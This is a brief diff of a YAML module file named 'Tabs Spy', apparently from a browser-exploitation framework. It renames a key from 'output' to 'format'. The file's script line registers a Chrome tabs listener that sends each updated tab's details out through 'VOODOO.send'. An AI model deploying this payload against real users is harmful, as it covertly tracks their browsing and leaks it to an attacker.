@@ -2,7 +2,7 @@ info:
   name: Tabs Spy
   author: Mr. Test
 
-output: payload
+format: payload
 
 scripts:
   - content: chrome.tabs.onUpdated.addListener((_,tab) => VOODOO.send(tab));
